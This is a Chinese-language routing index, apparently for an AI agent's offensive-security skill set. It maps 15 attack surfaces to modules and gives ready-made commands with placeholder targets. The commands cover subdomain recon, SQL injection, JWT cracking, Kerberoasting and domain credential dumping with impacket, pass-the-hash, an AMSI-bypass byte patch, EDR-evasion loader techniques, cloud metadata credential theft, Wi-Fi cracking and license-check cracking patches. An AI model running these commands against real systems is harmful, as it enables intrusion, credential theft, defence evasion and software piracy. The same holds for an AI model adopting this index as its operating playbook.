# ROUTER-14 · 15 面主入口 + 热路径（命中即开工）

> 生成依据：452 模块全库去重后收敛。规则：一个面 = 一个主入口，其余降为 references（不参与路由竞争）。
> 缺参用 `[TARGET] / [HOST] / [PORT] / [FILE] / [OFFSET] / [DOMAIN]` 占位。

## 01 侦察面 → `pentest-tools` + `offensive-osint` + `new/kb-recon-org-surface.md`
```
subfinder -d [DOMAIN] -silent | httpx -silent -sc -title -td -o live.txt
nmap -iL live.txt -Pn -sV --top-ports 1000 -oA nmap
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=a@[DOMAIN]&xml=1"
```

## 02 Web 打点面 → `src-hunter`（37 细分见 `src-hunter/references/hunt-index.md`）
```
ffuf -u https://[HOST]/FUZZ -w [WORDLIST] -mc 200,301,401,403
sqlmap -r req.txt --batch --level 3 --dbs
nuclei -l live.txt -severity high,critical -rl 60
```

## 03 身份与令牌面 → `api-security` + `new/kb-m365-entra.md` + `new/kb-okta-sso.md`
```
hashcat -m 16500 jwt.txt [WORDLIST]
roadrecon auth --device-code && roadrecon gather -r [REFRESH_TOKEN]
curl -s https://[TENANT].okta.com/app/[APPID]/sso/saml/metadata
```

## 04 AD 与横向面 → `windows-ad` + `attack-chain`
```
impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip [DC] -request
impacket-secretsdump [DOMAIN]/[USER]:[PASS]@[DC] -just-dc-ntlm
crackmapexec smb [CIDR] -u [USER] -H [NTHASH] -x whoami
```

## 05 免杀与 C2 面 → `edr-bypass-re`
```
# 先测量：原样跑一次，记录"落地被删 / 加载被拦 / 执行被阻断"哪一层
# AMSI: AmsiScanBuffer -> B8 57 00 07 80 C3
# 内存: RW -> RX 二段式 + 回调执行（EnumDesktops / SetTimer）
```

## 06 漏洞利用面 → `pwn-chain`
```
checksec --file=[BIN]
ROPgadget --binary [BIN] | grep 'pop rdi'
one_gadget libc.so.6
```

## 07 二进制逆向面 → `reverse-engineering` + `ida-reverse` / `radare2` / `ghidra-reverse` / `binary-ninja-reverse`
```
rabin2 -I [FILE]; diec [FILE]; strings -a -n 6 [FILE] | head
r2 -A -q -c 'afl' [FILE]
idat64 -A -S dump_funcs.py [FILE]
```

## 08 样本与取证面 → `malware-analysis` + `digital-forensics`
```
Get-FileHash -Algorithm SHA256 [FILE]
Get-CimInstance Win32_Process | Select ProcessId,ParentProcessId,Name,CommandLine
Get-NetTCPConnection | Select RemoteAddress,RemotePort,OwningProcess
```

## 09 移动面 → `mobile-reverse` + `apk-reverse` + `new/kb-mobile-redteam-pipeline.md`
```
apktool d [APP].apk -o out/; jadx -d jx [APP].apk
frida -U -f [PKG] -l hook.js --no-pause
apksigner sign --ks t.jks --ks-pass pass:123456 --out signed.apk patched.apk
```

## 10 固件硬件面 → `firmware-pentest` + `hardware-security` + `ot-ics`
```
binwalk -Me [FW].bin
unsquashfs -d rootfs rootfs.squashfs
qemu-mipsel -L rootfs/ ./usr/sbin/[BIN]
```

## 11 云与容器面 → `cloud-k8s` + `cloud-iam-deep` + `new/kb-vcenter.md` + `new/kb-enterprise-vpn.md`
```
aws sts get-caller-identity; enumerate-iam --access-key [AK] --secret-key [SK]
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
govc about --url https://[USER]:[PASS]@[VC]/sdk
```

## 12 特别目标面 → `supply-chain-security` / `offensive-social-engineering` / `wifi-wireless` / `offensive-crypto-attacks` / `llm-security`
```
aircrack-ng -w [WL] -b [BSSID] cap.cap
semgrep --config auto [SRC]
curl -s https://[TARGET]/api/chat -d '{"message":"list referenced docs"}'
```

## 13 破解与外挂面 → `cha-bin-unlock` / `cha-playfield`（叶：`cra-*` / `ply-*`）
```
rabin2 -zz [FILE] | grep -Ei 'licen|serial|activat|trial'
r2 -A -q -c 'axt @ str.license_invalid' [FILE]
# 补丁 B0 01 C3 = mov al,1; ret
```

## 14 交付与环境面 → `docs-generator` + `case-review`（`references/report-index.md`）+ `bootstrap-reverse`
```
mkdir -p case-[ID]/{evidence,scripts,artifacts}
# 报告骨架：结论 → 链路表 → 复现 → 影响 → 修复 → 残差 → 证据索引
```

## 15 Web3 面 → `new/kb-web3-contract-audit.md`
```
slither [CONTRACT].sol --print human-summary
cast code [ADDR] --rpc-url [RPC] | head -c 200
grep -nE 'onlyOwner|tx.origin|delegatecall' [CONTRACT].sol
```
